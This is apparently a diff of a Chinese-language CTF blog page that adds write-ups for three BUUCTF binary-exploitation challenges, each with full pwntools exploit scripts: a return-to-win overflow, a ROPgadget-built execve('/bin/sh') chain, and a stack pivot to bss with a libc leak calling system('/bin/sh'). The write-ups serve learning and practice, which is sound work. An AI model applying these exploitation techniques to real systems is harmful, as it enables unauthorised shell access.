@@ -28,8 +28,27 @@
 <meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218180822229.png">
 <meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218180902406.png">
 <meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240219183417324.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220190159255.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220190232528.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220203254629.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220203356843.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220203422450.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220203643716.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220203849221.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220204945466.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220204743173.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220205159713.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220205509448.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220205531121.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220210011864.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220212817837.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220213138456.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220215504883.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220215452436.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20231006141212834.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240220220539215.png">
 <meta property="article:published_time" content="2024-02-17T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-02-19T10:44:33.948Z">
+<meta property="article:modified_time" content="2024-02-20T14:30:27.658Z">
 <meta property="article:author" content="shy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218104334527.png">
@@ -81,7 +100,7 @@
                                                总文章数 40
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">66.9k</span>
+	总字数 <span class="post-count">67.9k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -179,7 +198,7 @@
     
       <header class="article-header">
         <div align="center" class="post-count">
-    字数：603字 | 预计阅读时长：2分钟
+    字数：1.6k字 | 预计阅读时长：7分钟
 </div>
         
   
@@ -251,6 +270,77 @@
 
 <p>payload1泄露write函数的地址，以此计算libc库的基址，根据libc库的基址获取system和&#x2F;bin&#x2F;sh的地址，payload2执行shell。</p>
 <p><img src="/2024/02/18/buuctf-pwn/image-20240219183417324.png"></p>
+<h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow_1"></a>picoctf_2018_buffer overflow_1</h2><p>运行一下：</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220190159255.png"></p>
+<p>查看保护：</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220190232528.png"></p>
+<p>32位，没开启保护</p>
+<p>ida查看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220203254629.png"></p>
+<p>可以看到flag.txt</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220203356843.png"></p>
+<p>在win函数中引用</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220203422450.png"></p>
+<p>gets函数覆盖返回地址至win函数即可。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">win_addr = <span class="number">0x080485CB</span></span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">44</span></span><br><span class="line">payload += p32(win_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220203643716.png"></p>
+<h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h2><p><img src="/2024/02/18/buuctf-pwn/image-20240220203849221.png"></p>
+<p>32位程序</p>
+<ul>
+<li><code>one-gadget</code>利用</li>
+</ul>
+<ol>
+<li><code>overflow()</code>函数中存在溢出</li>
+<li>没有<code>system</code>也没有输出函数</li>
+<li>没有<code>/bin/sh</code>或者<code>sh</code>可利用字段</li>
+<li>程序是静态链接</li>
+</ol>
+<p><code>file rop</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220204945466.png"></p>
+<p>ida查看漏洞函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220204743173.png"></p>
+<p>利用<code>ROPgadgets</code>工具生成<code>ROP</code>链</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220205159713.png"></p>
+<p>查看偏移字段</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220205509448.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220205531121.png"></p>
+<p><code>12+4=16</code></p>
+<p>构造payload获取shell</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">pro = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">pro.send(p)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220210011864.png"></p>
+<h2 id="Black-Watch-入群题-PWN1"><a href="#Black-Watch-入群题-PWN1" class="headerlink" title="[Black Watch 入群题]PWN1"></a>[Black Watch 入群题]PWN1</h2><p><img src="/2024/02/18/buuctf-pwn/image-20240220212817837.png"></p>
+<p>32位程序，开启了栈不可执行</p>
+<p>ida查看漏洞函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220213138456.png"></p>
+<p>偏移<code>0x18+4</code>，但是只能输入0x20字节，不足以构造rop链</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220215504883.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220215452436.png"></p>
+<p>s所在的bss段不可执行，可以在s处构造rop链，然后通过栈迁移到bss段来执行rop。</p>
+<p><strong>栈迁移：</strong></p>
+<p>利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave     //mov esp ebp       pop ebp</span><br><span class="line">ret         //pop eip</span><br></pre></td></tr></table></figure>
+
+<p>程序本身有一次leave ret</p>
+<p>这一次会将ebp指向的值传给esp，即两者会指向同一位置，由于ebp被覆盖成了fake ebp，ebp指针原本指向本来的ebp，所以此时两者都会指向fake ebp，此时再执行pop ebp就会将ebp寄存器劫持到fake ebp也就是我们shellcode的起始地址。</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20231006141212834.png"></p>
+<p>之后esp指向我们填充的leave ret</p>
+<p>此时再执行 mov esp ebp就会将esp也指向fake ebp，由于还会执行 pop ebp，所以shellcode的前四个字节需要填充，由于劫持程序执行流只需要esp，所以任意填充四字节赋给ebp即可，接下来就会正常执行我们填充的shellcode。</p>
+<p>首先先泄露libc基址，再将rop链写到bss段，最后通过栈迁移劫持到bss段执行</p>
+<p>寻找<code>leave ret</code></p>
+<p><code>ROPgadget --binary spwn --only &quot;leave|ret&quot;</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240220220539215.png"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line">io=process(<span class="string">&quot;./spwn&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main=<span class="number">0x08048513</span></span><br><span class="line">s_addr=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048511</span></span><br><span class="line">io.recv()</span><br><span class="line">payload1=p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv()</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+p32(s_addr-<span class="number">4</span>)+p32(leave_ret)   //由于pop ebp，所以s_addr-<span class="number">4</span>,经过一次pop之后就到了bss段的起址</span><br><span class="line">io.send(payload2)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload3=p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.recvuntil(<span class="string">&quot;say?&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>第一段将rop写入bss栈迁移到bss段泄露libc，同理第二段执行shell。</p>
 
       
 
@@ -373,7 +463,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%88%B7%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">PWN刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">mrctf2020_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-number">1.2.</span> <span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level4"><span class="toc-number">1.3.</span> <span class="toc-text">jarvisoj_level4</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%88%B7%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">PWN刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">mrctf2020_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-number">1.2.</span> <span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level4"><span class="toc-number">1.3.</span> <span class="toc-text">jarvisoj_level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-buffer-overflow-1"><span class="toc-number">1.4.</span> <span class="toc-text">picoctf_2018_buffer overflow_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inndy-rop"><span class="toc-number">1.5.</span> <span class="toc-text">inndy_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN1"><span class="toc-number">1.6.</span> <span class="toc-text">[Black Watch 入群题]PWN1</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
